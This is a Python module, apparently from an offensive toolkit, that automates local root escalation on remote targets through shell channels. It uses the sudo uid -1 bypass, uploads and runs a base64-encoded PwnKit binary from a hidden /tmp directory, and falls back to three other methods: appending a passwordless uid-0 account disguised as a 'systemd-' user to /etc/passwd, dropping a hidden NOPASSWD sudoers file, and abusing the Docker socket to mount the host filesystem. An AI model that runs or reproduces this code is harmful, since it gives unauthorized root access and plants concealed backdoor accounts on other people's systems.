"""Lokale Root-Eskalation (PwnKit / sudo uid-Trick) fuer Shell-Kanaele."""
from __future__ import annotations
import base64
import os
import secrets

from .exploit import RunResult

B64 = os.path.join(os.path.dirname(os.path.dirname(__file__)), "bin", "PwnKit.b64")


class RootChannel:
    def __init__(self, base, dirpath):
        self.base, self.dir = base, dirpath

    def run(self, target, cmd, timeout=None, audit=None):
        inner = f"cd {self.dir} && ./PwnKit \"{cmd.replace(chr(34), chr(92)+chr(34))}\""
        return self.base.run(target, inner, timeout=timeout, audit=audit)

    def proof(self, target, token, timeout=None):
        return token in self.run(target, f"echo {token}").stdout


class SudoChannel:
    def __init__(self, base):
        self.base = base

    def run(self, target, cmd, timeout=None, audit=None):
        return self.base.run(target, "sudo -n -u#-1 sh -c '" + cmd.replace("'", "'\\''") + "'",
                             timeout=timeout, audit=audit)

    def proof(self, target, token, timeout=None):
        return token in self.run(target, f"echo {token}").stdout


class SuChannel:
    def __init__(self, base, user):
        self.base, self.user = base, user

    def run(self, target, cmd, timeout=None, audit=None):
        inner = f"su {self.user} -c \"{cmd.replace(chr(34), chr(92)+chr(34))}\""
        return self.base.run(target, inner, timeout=timeout, audit=audit)

    def proof(self, target, token, timeout=None, audit=None):
        return token in self.run(target, f"echo {token}").stdout


def _writable_passwd(ch, t, audit):
    r = ch.run(t.url, "test -w /etc/passwd && echo W")
    if "W" not in r.stdout:
        return None
    u = "systemd-" + secrets.token_hex(2)
    cmd = (f"grep -q '^{u}:' /etc/passwd || "
           f"echo '{u}::0:0:root:/root:/bin/sh' >> /etc/passwd")
    ch.run(t.url, cmd)
    if "uid=0(" in SuChannel(ch, u).run(t.url, "id").stdout:
        audit.write("privesc", "writable-passwd", t.url, user=u)
        return SuChannel(ch, u)
    return None


def _sudoers_drop(ch, t, audit):
    r = ch.run(t.url, 'd=$(ls -d /etc/sudoers.d 2>/dev/null); [ -n "$d" ] && test -w "$d" && echo W')
    if "W" not in r.stdout:
        return None
    u = "systemd-" + secrets.token_hex(2)
    cmd = (f"id -u {u} >/dev/null 2>&1 || useradd -o -u 0 -M -s /bin/sh {u} 2>/dev/null; "
           f"printf '{u} ALL=(ALL) NOPASSWD:ALL\n' > /etc/sudoers.d/.{u}; echo OK")
    x = ch.run(t.url, cmd)
    if "OK" not in x.stdout:
        return None
    if "uid=0(" in ch.run(t.url, f"sudo -n -u {u} id").stdout:
        audit.write("privesc", "sudoers-drop", t.url, user=u)
        priv = {"is_root": True}
        return SudoChannel(ch), priv
    return None


def _docker_sock(ch, t, audit):
    r = ch.run(t.url, "test -S /var/run/docker.sock && echo S")
    if "S" not in r.stdout:
        return None
    base = "/var/run/docker.sock"

    class DockCh:
        def run(self2, target, cmd, timeout=None, audit=None):
            from .exploit import RunResult
            body = ("{\"Image\":\"alpine\",\"Cmd\":[\"/bin/sh\",\"-c\","
                    + repr(cmd).replace("'", '"') + "],\"Binds\":[\"/:/host\"]}")
            cid = ch.run(t.url, "curl -s --unix-socket " + base +
                         " -H 'Content-Type: application/json' -d '" + body +
                         "' http://localhost/containers/create?name=dwx").stdout
            cid = cid.split('"Id":"')[1].split('"')[0] if '"Id"' in cid else ""
            if not cid:
                return RunResult(False, "", "create", 3)
            ch.run(t.url, f"curl -s --unix-socket {base} -X POST http://localhost/containers/{cid}/start")
            out = ch.run(t.url, f"docker logs {cid[:12]} 2>&1 | head -200").stdout or ""
            if not out:
                out = ch.run(t.url, f"curl -s --unix-socket {base} http://localhost/containers/{cid}/logs?stdout=1").stdout or ""
            return RunResult(True, out)

        def proof(self2, target, token, timeout=None, audit=None):
            return token in self2.run(target, f"echo {token}").stdout

    return DockCh()


def escalate(ch, t, priv: dict, audit):
    if priv.get("is_root") or priv.get("can_sudo"):
        return ch, priv
    r = ch.run(t.url, "sudo -n -u#-1 id 2>&1 | head -1", timeout=40)
    if "uid=0(" in r.stdout:
        audit.write("privesc", "sudo-uid", t.url)
        priv = dict(priv, is_root=True, can_sudo=True)
        return SudoChannel(ch), priv

    if "uid=0(" in ch.run(t.url, "id 2>/dev/null").stdout:
        priv = dict(priv, is_root=True)
        return ch, priv

    r = ch.run(t.url, "command -v pkexec; pkexec --version 2>&1 | head -1", timeout=40)
    if "pkexec" not in r.stdout:
        return ch, priv
    try:
        data = open(B64).read().strip()
    except FileNotFoundError:
        return ch, priv
    d = "/tmp/." + secrets.token_hex(3)
    setup = (f"mkdir -p {d} && cd {d} && printf %s '{data}' | base64 -d > PwnKit && "
             f"chmod 700 PwnKit")
    u = ch.run(t.url, setup, timeout=180)
    if u.code not in (0, 1, 2):
        return ch, priv
    p = RootChannel(ch, d).run(t.url, "id", timeout=60)
    if "uid=0(" not in p.stdout:
        for fn in (_writable_passwd, _sudoers_drop, _docker_sock):
            try:
                got = fn(ch, t, audit)
            except Exception:
                got = None
            if got:
                if isinstance(got, tuple):
                    return got
                return got, dict(priv, is_root=True)
        return ch, priv
    audit.write("privesc", "pwnkit", t.url)
    priv = dict(priv, is_root=True, can_sudo=True)
    return RootChannel(ch, d), priv
